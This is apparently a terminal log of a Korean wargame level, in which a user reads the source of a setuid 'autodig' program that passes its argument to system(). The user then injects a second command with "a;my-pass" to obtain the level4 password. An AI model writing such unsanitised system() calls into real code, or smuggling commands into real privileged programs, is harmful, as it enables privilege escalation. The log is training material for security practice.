login as: level3
level3@192.168.35.100's password:
Access denied
level3@192.168.35.100's password:
[level3@ftz level3]$ ll
total 12
-rw-r--r--    1 root     root          543 Nov 26  2000 hint
drwxr-xr-x    2 root     level3       4096 Feb 24  2002 public_html
drwxrwxr-x    2 root     level3       4096 Jan 15  2009 tmp
[level3@ftz level3]$ cat hint


다음 코드는 autodig의 소스이다.

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv){

    char cmd[100];

    if( argc!=2 ){
        printf( "Auto Digger Version 0.9\n" );
        printf( "Usage : %s host\n", argv[0] );
        exit(0);
    }

    strcpy( cmd, "dig @" );
    strcat( cmd, argv[1] );
    strcat( cmd, " version.bind chaos txt");

    system( cmd );

}

이를 이용하여 level4의 권한을 얻어라.

more hints.
- 동시에 여러 명령어를 사용하려면?
- 문자열 형태로 명령어를 전달하려면?


[level3@ftz level3]$ find / -user level4 -perm -4000 2>/dev/null
/bin/autodig
[level3@ftz level3]$ /bin/autodig
Auto Digger Version 0.9
Usage : /bin/autodig host
[level3@ftz level3]$ /bin/autodig "a;my-pass"
dig: Couldn't find server 'a': Name or service not known

Level4 Password is "suck my brain".

[level3@ftz level3]$
